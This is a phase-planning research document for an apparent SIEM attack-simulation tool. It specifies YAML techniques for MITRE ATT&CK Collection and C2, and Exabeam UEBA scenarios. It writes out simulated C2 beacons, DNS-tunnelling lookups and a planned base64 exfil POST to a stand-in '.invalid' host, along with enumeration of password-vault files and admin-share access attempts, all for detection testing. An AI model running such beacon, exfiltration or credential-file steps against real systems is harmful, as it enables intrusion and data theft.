# Phase 3: Additional Techniques - Research

**Researched:** 2026-03-25
**Domain:** MITRE ATT&CK YAML technique authoring — Collection, Command & Control, UEBA scenarios
**Confidence:** HIGH

---

<user_constraints>
## User Constraints (from CONTEXT.md)

### Locked Decisions

- **D-01:** Add exactly 5 new MITRE ATT&CK techniques — minimum to satisfy TECH-01 success criteria.
- **D-02:** Focus on filling tactic coverage gaps: **Collection** (T1005 Data from Local System, T1560 Archive Collected Data) and **Command & Control** (T1071 Application Layer Protocol, T1095 Non-Application Layer Protocol). Fifth technique: Claude's discretion — choose from remaining gap areas (Initial Access artifacts or additional C2/Collection variant).
- **D-03:** All 5 new techniques must include `expected_events` with structured EventSpec entries (event_id, channel, description) — same format as all existing techniques.
- **D-04:** Add 4 new Exabeam UEBA scenarios (exceeds the 3-scenario minimum):
  1. Data staging + exfiltration — user copies large volumes to staging dir then exfils; triggers Exabeam data exfiltration use case
  2. Account takeover chain — failed logins → success → new device + unusual hour; triggers Exabeam account compromise chain
  3. Privilege escalation chain — normal user runs admin tools, token impersonation; triggers Exabeam abnormal privilege use case
  4. Lateral movement + new asset — first-time access to new internal host via SMB/RDP; triggers Exabeam new asset access + lateral movement use case
- **D-05:** Each UEBA scenario follows the existing chain YAML pattern (tactic: ueba-scenario, phase: attack/discovery) and includes `expected_events` per the EventSpec format.
- **D-06:** New techniques follow the multi-variant deep execution style established by existing techniques (e.g., T1057 uses 5+ commands with multiple LOLBin variants). Each technique should use 3–5 commands/methods to maximize SIEM signal diversity and demonstrate multiple detection opportunities.
- **D-07:** For C2 simulation (T1071, T1095): use safe, realistic beacon simulation (DNS lookups to known benign domains, HTTP GET to localhost/loopback) — must NOT generate actual outbound C2 traffic. Generate the expected Windows/Sysmon events without real exfiltration.
- **D-08:** Add new technique rows to the **existing technique table** in the German README — do not restructure the README or add new sections. Keep consistent with current table format.

### Claude's Discretion

- Selection of the 5th ATT&CK technique (from remaining gap areas — Initial Access artifacts, additional C2 variant, or another tactic with no current coverage)
- Specific T-IDs for C2 techniques (T1071.001 Web Protocols, T1071.004 DNS, T1095 Non-App Layer are all candidates — pick the most SIEM-detectable variants)
- Exact commands used in Collection techniques (T1005, T1560) — must simulate file enumeration/staging artifacts safely, no real sensitive data copied
- German README table column values for new techniques — match existing row format exactly

### Deferred Ideas (OUT OF SCOPE)

- Initial Access artifacts (T1566 phishing simulation) — mentioned during selection but not prioritized; consider for a future technique expansion phase
- More Execution variants (T1059_005 VBScript, T1106 Native API) — deferred to future phase
- T1558_001 Golden Ticket, T1556 modify auth process — deferred to future Credential Access expansion
</user_constraints>

---

<phase_requirements>
## Phase Requirements

| ID | Description | Research Support |
|----|-------------|------------------|
| TECH-01 | At least 5 additional MITRE ATT&CK techniques added (Discovery or Attack phase) | D-01/D-02 locked: T1005, T1560, T1071.001, T1071.004 (or T1095), plus one more at Claude's discretion. All use phase: "attack" matching Collection/C2 tactic. |
| TECH-02 | At least 3 additional Exabeam UEBA scenarios added | D-04 specifies exactly 4 scenarios (exceeds minimum). All follow tactic: ueba-scenario pattern. |
| TECH-03 | All existing and new techniques have events manifest entries (VERIF-01 coverage) | D-03 mandates expected_events on all 9 new files. No engine changes required — loader auto-discovers files. |
</phase_requirements>

---

## Summary

Phase 3 is a pure content-authoring phase — no engine, server, reporter, or test changes. Work is entirely writing new YAML files dropped into `internal/playbooks/embedded/techniques/` and extending rows in the German README. The Go embed directive (`//go:embed embedded`) picks up new files automatically at build time; the loader's `fs.WalkDir` over `embedded/techniques/` auto-registers every `.yaml` without any registration step. No Go code changes are needed.

The technique format is fully established and verified through 43 existing files. EventSpec (event_id, channel, description, optional contains) is the struct that powers Phase 1's verification engine. Every new YAML must populate `expected_events` with entries the Windows Event Log query system can actually find — meaning only queryable channels: Security, Microsoft-Windows-PowerShell/Operational, Microsoft-Windows-Sysmon/Operational. Non-queryable sources (proxy/firewall, EDR telemetry) must be excluded from expected_events (same decision as Phase 1 Plan 02).

The 5 ATT&CK techniques fill two tactic gaps. Collection (T1005, T1560) has zero existing coverage. C2 (T1071, T1095) has zero existing coverage though T1041 Exfiltration partially overlaps. The 5th technique at discretion is T1119 (Automated Collection) — it pairs naturally with T1005/T1560 as a Collection tactic variant, adds a distinct automation angle, and generates EID 4688 and EID 4104 events without any real data risk.

**Primary recommendation:** Write 9 new YAML files (5 ATT&CK + 4 UEBA) following the T1057/UEBA_credential_spray_chain templates, then add matching rows to the German README technique table. No code changes required.

---

## Standard Stack

### Core

| Library/Tool | Version | Purpose | Why Standard |
|---------|---------|---------|--------------|
| YAML (gopkg.in/yaml.v3) | already in go.mod | YAML parsing for new technique files | Same library used by all 43 existing techniques |
| PowerShell 5.1+ | OS-provided | Executor for all new techniques | All existing techniques use `executor.type: powershell` |
| Windows Event Log | OS-provided | Source of expected_events queries | Security, Sysmon, and PS Operational channels already queryable |
| Sysmon | Pre-installed via Preparation phase | Generates EID 1/3/22 events | Required for network-visible techniques (T1071, T1095) |

### Supporting

| Item | Purpose | When to Use |
|------|---------|-------------|
| `compress.exe` / `Compress-Archive` PS cmdlet | T1560 archive simulation | Creating zip/cab archives to generate file creation events |
| `cmd /c dir /s /b` | T1005 file enumeration pattern | Generates EID 4688 for cmd.exe — proven pattern from T1083 |
| `Invoke-WebRequest` to localhost | T1071.001 C2 beacon simulation | Safe HTTP; generates Sysmon EID 3 without real outbound C2 |
| `Resolve-DnsName` / `nslookup` | T1071.004 DNS C2 simulation | Generates Sysmon EID 22 (DNSEvent) without real C2 |
| `Test-NetConnection -Port 53/80` | T1095 non-app layer simulation | Generates Sysmon EID 3 for raw TCP probe |

### Alternatives Considered

| Instead of | Could Use | Tradeoff |
|------------|-----------|----------|
| `Compress-Archive` for T1560 | `7z.exe`, `WinRAR` | Third-party tools may not be installed; Compress-Archive is PS built-in |
| `Invoke-WebRequest` for T1071 | `curl.exe` (Win10+) | Both generate Sysmon EID 3; `Invoke-WebRequest` also triggers EID 4104 (higher SIEM signal) |
| `Resolve-DnsName` for DNS C2 | `nslookup.exe` | `nslookup.exe` generates EID 4688 + Sysmon EID 22; both valid, nslookup has more coverage |

---

## Architecture Patterns

### No Code Changes Required

The existing architecture auto-discovers and loads all YAML files. The complete integration model is:

```
internal/playbooks/embedded/techniques/
├── [new_technique].yaml   ← Drop file here
```

`loader.go` uses `fs.WalkDir(embeddedFS, "embedded/techniques", ...)` which picks up every `.yaml` file. The embed directive `//go:embed embedded` bakes all files into the binary at build time. Zero registration required.

### Pattern 1: Multi-Variant ATT&CK Technique (established by T1057, T1083)

**What:** Execute the same technique using 3–5 different LOLBin/cmdlet variants. Each variant produces a distinct process creation event, maximizing SIEM detection coverage.

**When to use:** All 5 new ATT&CK techniques.

**YAML skeleton (confirmed by reading existing files):**
```yaml
id: T1005
name: Data from Local System
description: <attacker motivation + SIEM signal explanation>
tactic: collection
technique_id: T1005
platform: windows
phase: attack
elevation_required: false
expected_events:
  - event_id: 4688
    channel: "Security"
    description: "cmd.exe — dir /s /b on sensitive paths"
  - event_id: 4104
    channel: "Microsoft-Windows-PowerShell/Operational"
    description: "PowerShell ScriptBlock — Get-ChildItem on credential/config paths"
  - event_id: 1
    channel: "Microsoft-Windows-Sysmon/Operational"
    description: "Sysmon process creation — robocopy or xcopy to staging dir"
tags:
  - collection
  - no-prereqs
executor:
  type: powershell
  command: |-
    Write-Host "[T1005] Data from Local System — ..."
    # ... multi-variant commands ...
    Write-Host "[T1005] Complete. EID 4688 + 4104 + Sysmon 1 generated."
cleanup: ""
```

### Pattern 2: UEBA Chain Scenario (established by UEBA_credential_spray_chain, UEBA_lateral_discovery_chain)

**What:** A scenario that chains multiple security-relevant events in a behavioral sequence. The sequence, not individual events, is what triggers Exabeam correlation use cases.

**When to use:** All 4 new UEBA scenarios.

**Key fields:**
```yaml
tactic: ueba-scenario
technique_id: <ATT&CK ID most representative of the scenario>
phase: attack
elevation_required: false  # or true if scenario requires admin (privilege escalation chain)
tags:
  - ueba
  - exabeam
  - <scenario-specific>
```

**UEBA scenario command pattern:** Each scenario ends with an explicit `UEBA DETECTION EXPECTED:` block explaining which Exabeam use cases should fire. This is required for consistency with existing UEBA files.

### Pattern 3: C2 Safe Simulation (established by T1041)

**What:** Simulate network communication artifacts using loopback or non-routable destinations so Sysmon generates the expected network events (EID 3, EID 22) without real outbound traffic.

**When to use:** T1071.001 (HTTP), T1071.004 (DNS), T1095 (raw TCP).

**Proven approach from T1041:**
```powershell
# HTTP: always fails connection, but Sysmon EID 3 fires on the attempt
try {
    Invoke-WebRequest -Uri "http://lognojutsu-c2.invalid/beacon" -TimeoutSec 3 -ErrorAction Stop
} catch {
    Write-Host "Connection failed as expected. Sysmon EID 3 generated."
}

# DNS: Resolve-DnsName for a non-existent host generates EID 22
Resolve-DnsName "beacon.lognojutsu-c2.invalid" -ErrorAction SilentlyContinue

# Raw TCP: Test-NetConnection generates Sysmon EID 3 on port probe
Test-NetConnection -ComputerName "127.0.0.1" -Port 4444 -InformationLevel Quiet
```

### Pattern 4: Collection Staging (new, pairs T1005 + T1560 + T1119)

**What:** T1005 enumerates and reads files; T1560 archives collected data; T1119 automates collection via script loops. These three naturally chain.

**Safe simulation approach (no real sensitive data):**
- Create synthetic files in `$env:TEMP\lnj_stage\` (same pattern as T1041's `lnj_exfil_data.txt`)
- Enumerate `$env:USERPROFILE` paths (reads only — no copy of real data)
- Archive synthetic files using `Compress-Archive` to generate EID 4104 + file creation
- All cleanup removes `$env:TEMP\lnj_*` artifacts

### Recommended File Naming

Follow the existing naming convention observed in the 43 existing files:

```
T1005_data_from_local_system.yaml
T1119_automated_collection.yaml
T1560_001_archive_collected_data.yaml
T1071_001_web_protocols.yaml
T1071_004_dns.yaml
UEBA_data_staging_exfil_chain.yaml
UEBA_account_takeover_chain.yaml
UEBA_privilege_escalation_chain.yaml
UEBA_lateral_movement_new_asset.yaml
```

### Anti-Patterns to Avoid

- **Non-queryable channels in expected_events:** Do NOT add proxy/firewall/Palo Alto/EDR channels. Phase 1 Plan 02 removed these specifically because the verifier can't query them. Only Security, Microsoft-Windows-PowerShell/Operational, and Microsoft-Windows-Sysmon/Operational are safe.
- **Real outbound C2 traffic:** All network-touching techniques must target non-routable or loopback destinations. T1041's pattern (`lognojutsu-c2.invalid`) is the established safe approach.
- **Real sensitive data copy:** Collection techniques must use synthetic data or enumerate (not copy) real paths. Use `$env:TEMP\lnj_*` for any created files.
- **Missing cleanup:** T1560 creates archive files. Cleanup block must remove `$env:TEMP\lnj_*` artifacts. T1005 and T1119 with enumeration-only need no cleanup.
- **Duplicate IDs:** The loader uses `Technique.ID` (yaml `id:` field) as the map key. Ensure unique IDs across all 9 new files.

---

## Don't Hand-Roll

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| File archiving | Custom compression code | `Compress-Archive` PS built-in | Available on all Win10+ without dependencies |
| DNS event generation | Custom DNS socket code | `Resolve-DnsName` or `nslookup.exe` | Both generate Sysmon EID 22 natively |
| HTTP network events | Custom TCP socket | `Invoke-WebRequest` | Generates both Sysmon EID 3 (network) and EID 4104 (ScriptBlock) — two detection vectors |
| YAML loading/registration | Custom file registry | Existing loader.go auto-discovery | `fs.WalkDir` already handles it — no changes needed |
| Failed auth events for UEBA | Custom auth API calls | `System.DirectoryServices.AccountManagement.PrincipalContext.ValidateCredentials` | Proven in UEBA_credential_spray_chain; generates real EID 4625 |

**Key insight:** The entire infrastructure (loader, verifier, reporter) is already built for Phase 3. The only work is authoring YAML content.

---

## Technique Specifications

### 5 New ATT&CK Techniques

#### T1005 — Data from Local System

| Field | Value |
|-------|-------|
| id | T1005 |
| tactic | collection |
| phase | attack |
| elevation_required | false |
| Expected EIDs | 4688 (cmd.exe dir), 4104 (Get-ChildItem PS), 1 (Sysmon process) |

**Commands (3–4 variants):**
1. `cmd /c "dir /s /b $env:USERPROFILE\Documents"` → EID 4688 for cmd.exe
2. `Get-ChildItem $env:USERPROFILE -Recurse -Include *.pdf,*.docx,*.xlsx,*.kdbx` → EID 4104
3. `robocopy $env:USERPROFILE\Desktop $env:TEMP\lnj_stage /e /xl /xj` → Sysmon EID 1 (robocopy.exe) + EID 4656 (file access)
4. Synthetic staging: write/read a test file to `$env:TEMP\lnj_stage\` to generate file access events

**Cleanup:** `Remove-Item "$env:TEMP\lnj_stage" -Recurse -Force -ErrorAction Ignore`

---

#### T1560.001 — Archive Collected Data: Archive via Utility

| Field | Value |
|-------|-------|
| id | T1560.001 |
| tactic | collection |
| phase | attack |
| elevation_required | false |
| Expected EIDs | 4104 (Compress-Archive PS ScriptBlock), 11 (Sysmon FileCreate for zip), 4688 (compact.exe optional) |

**Commands (3 variants):**
1. `Compress-Archive -Path $env:TEMP\lnj_stage -DestinationPath $env:TEMP\lnj_archive.zip` → EID 4104
2. `compact.exe /C $env:TEMP\lnj_stage` → EID 4688 for compact.exe
3. Check for Sysmon EID 11 (FileCreate) on the resulting `.zip`

**Cleanup:** `Remove-Item "$env:TEMP\lnj_archive.zip","$env:TEMP\lnj_stage" -Recurse -Force -ErrorAction Ignore`

**Note:** Pairs naturally with T1005 (T1005 stages → T1560 archives). Can be run independently but README should note the pairing.

---

#### T1071.001 — Application Layer Protocol: Web Protocols

| Field | Value |
|-------|-------|
| id | T1071.001 |
| tactic | command-and-control |
| phase | attack |
| elevation_required | false |
| Expected EIDs | 3 (Sysmon NetworkConnect HTTP), 4104 (Invoke-WebRequest ScriptBlock), 22 (Sysmon DNS for hostname resolution) |

**Commands (3–4 variants, all safe):**
1. `Invoke-WebRequest -Uri "http://lognojutsu-c2.invalid/beacon" -TimeoutSec 3` → EID 3 + EID 22 (DNS) + EID 4104
2. `Invoke-WebRequest -Uri "http://127.0.0.1:9999/c2/check-in"` → EID 3 (loopback, connection refused = still generates event)
3. `(New-Object System.Net.WebClient).DownloadString("http://lognojutsu-c2.invalid/tasks")` → EID 4104 (WebClient API)
4. Beacon interval simulation: 3 attempts with `Start-Sleep -Seconds 2` between them (simulates real C2 heartbeat)

**Safety note:** D-07 mandates no real outbound C2. All URIs must be `.invalid` TLD or loopback. The `.invalid` RFC-reserved TLD ensures DNS resolution fails safely but still generates EID 22.

---

#### T1071.004 — Application Layer Protocol: DNS

| Field | Value |
|-------|-------|
| id | T1071.004 |
| tactic | command-and-control |
| phase | attack |
| elevation_required | false |
| Expected EIDs | 22 (Sysmon DNSEvent for each query), 4688 (nslookup.exe), 4104 (Resolve-DnsName PS) |

**Commands (3 variants):**
1. `nslookup beacon.lognojutsu-c2.invalid` → EID 4688 (nslookup.exe) + EID 22 (DNS query)
2. Multiple subdomain lookups simulating DNS tunneling: `c2-1.lognojutsu-c2.invalid`, `c2-2.lognojutsu-c2.invalid`, etc. → multiple EID 22 events
3. `Resolve-DnsName "exfil-data.lognojutsu-c2.invalid" -ErrorAction SilentlyContinue` → EID 4104 + EID 22

**DNS C2 simulation note:** Real DNS C2 (Cobalt Strike DNS beacon) uses high-frequency queries to randomized subdomains. Simulate 5–10 queries to distinct subdomains of `.lognojutsu-c2.invalid` to mimic the behavioral pattern Exabeam/SIEM detect.

---

#### T1119 — Automated Collection (5th technique — Claude's discretion)

**Rationale for selection:** T1119 fills the "automated attacker script" Collection tactic slot. It pairs with T1005/T1560 to complete the Collection tactic coverage. It generates high-velocity EID 4104 ScriptBlock events (automation = loops = many events), which is a distinct SIEM detection signal from manual discovery commands. No existing technique covers automated collection scripts.

| Field | Value |
|-------|-------|
| id | T1119 |
| tactic | collection |
| phase | attack |
| elevation_required | false |
| Expected EIDs | 4104 (PS ScriptBlock with ForEach loop + file access), 4663 (Object Access — file read audit if enabled), 1 (Sysmon process for PowerShell) |

**Commands (3 variants):**
1. PS loop over `$env:USERPROFILE` paths collecting file metadata (names, sizes, modification times) into array → EID 4104
2. `Get-WmiObject Win32_LogicalDisk` + recursive file count → EID 4104 (WMI in ScriptBlock)
3. Write collected metadata to synthetic staging file `$env:TEMP\lnj_collection_index.txt` → file creation event

**Cleanup:** `Remove-Item "$env:TEMP\lnj_collection_index.txt" -ErrorAction Ignore`

---

### 4 New UEBA Scenarios

#### UEBA-DATA-STAGING (Data Staging + Exfiltration Chain)

| Field | Value |
|-------|-------|
| id | UEBA-DATA-STAGING |
| technique_id | T1074 (Data Staged) |
| tactic | ueba-scenario |
| phase | attack |
| elevation_required | false |
| Expected EIDs | 4104 (PS collection loop), 11 (Sysmon FileCreate for staged files), 3 (Sysmon NetworkConnect for exfil attempt) |

**Behavioral chain:**
1. Create synthetic sensitive files in `$env:TEMP\lnj_stage\`
2. Use Get-ChildItem loop to "collect" file metadata (automated staging behavior)
3. Attempt HTTP POST of base64-encoded "data" to `http://lognojutsu-c2.invalid/exfil`
4. Cleanup staged files

**Exabeam use case:** Data exfiltration — large volume copy + outbound connection in same session.

---

#### UEBA-ACCOUNT-TAKEOVER (Account Takeover Chain)

| Field | Value |
|-------|-------|
| id | UEBA-ACCOUNT-TAKEOVER |
| technique_id | T1078 (Valid Accounts) |
| tactic | ueba-scenario |
| phase | attack |
| elevation_required | false |
| Expected EIDs | 4625 (failed logon x5), 4624 (successful logon), 4688 (post-auth enumeration commands) |

**Behavioral chain:**
1. Generate 5 failed auth attempts via `PrincipalContext.ValidateCredentials` → EID 4625 x5
2. Log current time/hour (unusual hour note, same pattern as UEBA_offhours_activity)
3. Perform post-auth recon: `whoami`, `ipconfig`, `net user` → EID 4688 burst

**Exabeam use case:** Account compromise — failed → success chain + new enumeration activity.

---

#### UEBA-PRIVILEGE-ESCALATION (Privilege Escalation Chain)

| Field | Value |
|-------|-------|
| id | UEBA-PRIV-ESC |
| technique_id | T1134.001 (Token Impersonation) |
| tactic | ueba-scenario |
| phase | attack |
| elevation_required | false |
| Expected EIDs | 4688 (whoami /priv, net localgroup), 4673 (sensitive privilege use), 4104 (WindowsIdentity PS API), 4672 (special logon) |

**Behavioral chain:**
1. `whoami /priv` → enumerate current privileges
2. `net localgroup administrators` → check admin group membership
3. `.NET WindowsIdentity` API check → EID 4104
4. `runas /user:Administrator /savecred` attempt (fails safely, generates EID 4673)

**Exabeam use case:** Abnormal privilege use — normal user attempting admin tools/token checks.

**Distinction from T1134.001:** T1134.001 is a standalone ATT&CK simulation. This UEBA scenario chains the same actions into a behavioral sequence with UEBA framing, matching the pattern of UEBA_lateral_discovery_chain (which wraps T1087 actions into a chain scenario).

---

#### UEBA-LATERAL-NEW-ASSET (Lateral Movement + New Asset Chain)

| Field | Value |
|-------|-------|
| id | UEBA-LATERAL-NEW-ASSET |
| technique_id | T1021.002 (SMB/Admin Shares) |
| tactic | ueba-scenario |
| phase | attack |
| elevation_required | false |
| Expected EIDs | 5140 (network share object accessed), 4688 (net.exe with share args), 3 (Sysmon port 445 NetworkConnect), 4624 (logon if net use succeeds) |

**Behavioral chain:**
1. `net use \\127.0.0.1\C$` attempt → EID 5140 + Sysmon EID 3 (port 445)
2. `net view \\127.0.0.1` → enumerate shares on "remote" host
3. `net session` → check active sessions
4. `Test-NetConnection -ComputerName 127.0.0.1 -Port 445` → Sysmon EID 3

**Exabeam use case:** First-time access to new asset + lateral movement via SMB — triggers "new asset" and "lateral movement" use cases in Exabeam.

**Distinction from T1021.002:** T1021.002 is a local share enumeration technique. This UEBA chain focuses on "first-time-seen access to a remote host" behavioral pattern, using loopback as the "remote" target.

---

## Common Pitfalls

### Pitfall 1: Using Non-Queryable Channels in expected_events

**What goes wrong:** If an EventSpec lists a channel like `Microsoft-Windows-Sysmon/Operational` but Sysmon is not installed (or if a custom channel name is misspelled), the Phase 1 verifier will return `VerifFail` for every run. The verifier uses PowerShell `Get-WinEvent -FilterHashtable` to query events — it only works with channels that exist on the test system.

**Why it happens:** Researcher assumes all log sources are queryable. Phase 1 Plan 02 removed proxy/firewall entries specifically for this reason.

**How to avoid:** Only use these three verified-queryable channels:
- `"Security"` — standard Windows Security event log
- `"Microsoft-Windows-PowerShell/Operational"` — PS ScriptBlock logging
- `"Microsoft-Windows-Sysmon/Operational"` — requires Sysmon installed (Preparation phase handles this)

**Warning signs:** `VerifFail` on a newly added technique despite the command running successfully.

---

### Pitfall 2: C2 Techniques Generating Real Outbound Traffic

**What goes wrong:** A technique using a real external hostname (e.g., `evil.com`) generates actual DNS/HTTP traffic, which may trigger EDR/AV alerts or firewall blocks during testing, and violates the tool's simulation-only principle.

**Why it happens:** Copying Atomic Red Team examples that use real C2 domains.

**How to avoid:** Always use `.invalid` TLD (RFC 2606 reserved, guaranteed DNS failure) or loopback (`127.0.0.1`) as the target. Sysmon generates EID 3/22 on the attempt regardless of whether the connection succeeds.

**Warning signs:** Actual DNS resolution returning an IP, or network connection succeeding.

---

### Pitfall 3: UEBA Scenarios Overlapping Existing Scenarios Too Closely

**What goes wrong:** A new UEBA scenario that is functionally identical to an existing one (e.g., UEBA_offhours_activity) provides no additional detection value and clutters the scenario list.

**Why it happens:** Not reviewing existing UEBA files before authoring new ones.

**How to avoid:** The 4 new scenarios each target a distinct Exabeam use case family:
- UEBA-DATA-STAGING → data exfiltration use case (new)
- UEBA-ACCOUNT-TAKEOVER → account compromise chain (new — spray chain only covers the spray, not the post-auth behavior)
- UEBA-PRIV-ESC → privilege escalation behavioral chain (new)
- UEBA-LATERAL-NEW-ASSET → new asset + lateral movement (distinct from UEBA-LATERAL-CHAIN which covers recon enumeration)

---

### Pitfall 4: Missing Cleanup for File-Creating Techniques

**What goes wrong:** T1005 staging to `$env:TEMP\lnj_stage\`, T1560 creating `lnj_archive.zip`, and T1119 creating `lnj_collection_index.txt` leave artifacts that pollute subsequent test runs.

**Why it happens:** Copy-pasting from discovery techniques (T1082, T1087) that have `cleanup: ""` because they create no artifacts.

**How to avoid:** Any technique that creates files in `$env:TEMP\lnj_*` must have a cleanup block:
```yaml
cleanup: |-
  Remove-Item "$env:TEMP\lnj_stage" -Recurse -Force -ErrorAction Ignore
  Remove-Item "$env:TEMP\lnj_archive.zip" -ErrorAction Ignore
  Write-Host "Cleanup: Collection stage artifacts removed."
```

---

### Pitfall 5: README Row Format Mismatch

**What goes wrong:** New rows added to the German README technique table don't match the existing `| Eigenschaft | Wert |` per-technique sub-table format, causing visual inconsistency.

**Why it happens:** D-08 says "add new technique rows" but the README uses per-technique property tables, not a single master table. Each technique gets its own section with a 2-column property table.

**How to avoid:** Copy the exact heading + table structure from an existing technique section (e.g., T1082 System Information Discovery starting at line 381). Each new technique needs:
- `####` heading with ATT&CK ID and technique name
- A `| Eigenschaft | Wert |` property table with: MITRE ATT&CK (linked), Taktik, Exabeam-Regeln (approximate), Admin erforderlich, Cleanup
- `**Was wird ausgeführt:**` block with inline PowerShell code comment
- `**Erwartete SIEM-Events:**` bullet list
- `---` separator

The new techniques belong under the appropriate phase heading in the existing section structure: Collection and C2 techniques go under "Phase 2: Attack"; UEBA scenarios go under "UEBA-Szenarien (Exabeam)".

---

## Code Examples

### Verified YAML Structure (from T1057 and T1041)

```yaml
# Source: internal/playbooks/embedded/techniques/T1057_process_discovery.yaml
id: T1057
name: Process Discovery
tactic: discovery
technique_id: T1057
platform: windows
phase: discovery
elevation_required: false
expected_events:
  - event_id: 4688
    channel: "Security"
    description: "tasklist.exe with /v and /svc flags"
  - event_id: 4104
    channel: "Microsoft-Windows-PowerShell/Operational"
    description: "PowerShell ScriptBlock - Get-WmiObject Win32_Process CommandLine query"
tags:
  - discovery
  - no-prereqs
  - ueba-baseline
executor:
  type: powershell
  command: |-
    Write-Host "[T1057] ..."
    # commands
    Write-Host "[T1057] Complete. EID NNN + NNN generated."
cleanup: ""
```

### EventSpec Struct (from internal/playbooks/types.go)

```go
// Source: internal/playbooks/types.go
type EventSpec struct {
    EventID     int    `yaml:"event_id"`
    Channel     string `yaml:"channel"`
    Description string `yaml:"description"`
    Contains    string `yaml:"contains,omitempty"`  // optional filter
}
```

The optional `contains` field filters event log entries by substring match (e.g., `contains: "/priv"` on EID 4688 to distinguish `whoami /priv` from other `whoami.exe` invocations). Use this for disambiguation when the same EID is expected from multiple commands in the same technique.

### Safe C2 Beacon Pattern (derived from T1041)

```powershell
# Source: derived from T1041_exfiltration_http.yaml pattern
# HTTP beacon — generates Sysmon EID 3 + EID 22 without real outbound traffic
try {
    Invoke-WebRequest -Uri "http://lognojutsu-c2.invalid/beacon" `
        -Method GET -TimeoutSec 3 -ErrorAction Stop
} catch {
    Write-Host "Beacon failed as expected (target non-existent): $($_.Exception.Message)"
    Write-Host "Sysmon EID 3 (NetworkConnect) + EID 22 (DNS) generated on attempt."
}
```

### UEBA Detection Block Pattern (from all 3 existing UEBA files)

```powershell
# Always end UEBA command blocks with this exact section
Write-Host ""
Write-Host "UEBA DETECTION EXPECTED:"
Write-Host "  - Exabeam: <use case name>"
Write-Host "  - Exabeam: <second use case if applicable>"
Write-Host "  - <specific signal description>"
```

---

## State of the Art

| Old Approach | Current Approach | When Changed | Impact |
|--------------|------------------|--------------|--------|
| Any log source in expected_events | Only queryable channels (Security, PS/Operational, Sysmon/Operational) | Phase 1 Plan 02 | Non-queryable entries removed from all 43 existing YAMLs |
| Manual technique registration | Auto-discovery via fs.WalkDir | Phase 0 (original design) | Drop YAML → done, no code change needed |
| Single-command technique execution | Multi-variant (3–5 commands per technique) | Established before Phase 3 by T1057 pattern | Maximum SIEM signal diversity per technique |

**Deprecated/outdated:**
- `nist_controls` YAML field: Present in some techniques (T1041, T1021.002, T1134.001) but not in others (T1057, T1083). Optional — omit for new techniques unless specifically needed. The Web UI shows NIST column from this field, but it is not required by TECH-01/02/03.

---

## Open Questions

1. **Sysmon EID 11 (FileCreate) reliability for T1560 verification**
   - What we know: Sysmon EID 11 fires when a file is created by a monitored process. `Compress-Archive` creates `.zip` files.
   - What's unclear: Whether Sysmon's default file creation configuration captures PowerShell-created archives, or whether a specific Sysmon config rule is needed.
   - Recommendation: Use EID 4104 (PS ScriptBlock) as the primary verification event for T1560, with Sysmon EID 11 as optional/secondary. EID 4104 is guaranteed by PowerShell ScriptBlock logging.

2. **T1095 vs T1071.004 as 4th ATT&CK technique**
   - What we know: D-02 lists both T1071 Application Layer Protocol and T1095 Non-Application Layer Protocol as C2 gap areas. D-02 also lists T1071.001 (Web) and T1071.004 (DNS) as the primary choices.
   - What's unclear: Whether to implement T1095 as the 4th technique or T1071.004 as 4th and T1119 as 5th.
   - Recommendation: T1071.001 (HTTP) + T1071.004 (DNS) covers the Application Layer Protocol sub-technique gap with maximum SIEM value. T1119 (Automated Collection) is a better 5th than T1095, since T1095 (raw TCP) has minimal additional event generation beyond what T1071.001 already covers via Sysmon EID 3. T1095 can be deferred.

3. **UEBA-ACCOUNT-TAKEOVER EID 4624 generation**
   - What we know: The spray chain (existing UEBA_credential_spray_chain) generates EID 4625 but does NOT generate a real EID 4624 (the current user is already logged in).
   - What's unclear: Whether to include EID 4624 in expected_events given it may already exist from session logon but not from the technique itself.
   - Recommendation: List EID 4624 in expected_events with description "Logon event — existing session (Exabeam: new session after failures)". The verifier finds any matching EID 4624 within the time window — an existing session logon counts. This matches how UEBA_offhours_activity uses EID 4624 despite not creating a new logon.

---

## Environment Availability

| Dependency | Required By | Available | Version | Fallback |
|------------|------------|-----------|---------|----------|
| PowerShell 5.1+ | All 9 new YAML executors | Assumed present (all existing 43 techniques depend on it) | 5.1+ | None needed |
| Sysmon | EID 1/3/11/22 in expected_events | Pre-installed via Preparation phase | Variable | Exclude Sysmon EIDs from expected_events if Sysmon absent — but Preparation phase handles install |
| Windows Event Log (Security channel) | EID 4688, 4624, 4625, 4672, 4673, 5140 | Always present on Windows | Built-in | N/A |
| Windows Event Log (PS/Operational) | EID 4104 | Requires ScriptBlock logging enabled | Enabled via Preparation phase | N/A |
| `System.DirectoryServices.AccountManagement` | UEBA-ACCOUNT-TAKEOVER (EID 4625 generation) | Present (used by existing UEBA_credential_spray_chain) | .NET built-in | N/A |
| `Compress-Archive` | T1560.001 | Built-in PS 5.0+ cmdlet | Always available | `compact.exe` fallback |

**Missing dependencies with no fallback:** None — all dependencies are OS-provided or installed by the existing Preparation phase.

---

## Validation Architecture

Note: `workflow.nyquist_validation` is absent from `.planning/config.json` — treated as enabled.

### Test Framework

| Property | Value |
|----------|-------|
| Framework | Go testing (`go test ./...`) |
| Config file | None — standard Go test runner |
| Quick run command | `go test ./internal/playbooks/... -v -run TestLoad` |
| Full suite command | `go test ./... -count=1` |

### Phase Requirements → Test Map

| Req ID | Behavior | Test Type | Automated Command | File Exists? |
|--------|----------|-----------|-------------------|-------------|
| TECH-01 | 5 new ATT&CK techniques loaded by registry | unit | `go test ./internal/playbooks/... -run TestLoad` | Existing loader tests, likely pass with new files |
| TECH-02 | 4 new UEBA scenarios loaded by registry | unit | `go test ./internal/playbooks/... -run TestLoad` | Existing loader tests, likely pass with new files |
| TECH-03 | All new techniques have non-empty expected_events | unit | `go test ./internal/playbooks/... -run TestLoad` | Verify in loader test or new validation test |

### Sampling Rate

- **Per task commit:** `go test ./internal/playbooks/... -count=1`
- **Per wave merge:** `go test ./... -count=1`
- **Phase gate:** Full suite green before `/gsd:verify-work`

### Wave 0 Gaps

The existing Go test suite (added in Phase 2) includes loader tests. New YAML files will be picked up automatically by build-time embed. However, there is no existing test that specifically asserts all techniques have non-empty `expected_events`.

- [ ] Consider adding a test assertion: `for id, t := range registry.Techniques { assert len(t.ExpectedEvents) > 0 }` — satisfies TECH-03 in a machine-verifiable way. This is a Wave 0 gap if strict TECH-03 validation is desired.
- [ ] Manual smoke test: build binary, run `lognojutsu.exe`, verify 9 new entries appear in the Playbooks tab of the Web UI.

*(If this test gap is not addressed in Wave 0: TECH-03 is verified manually by inspecting YAML files — acceptable given the file-level constraint is human-readable.)*

---

## Sources

### Primary (HIGH confidence)

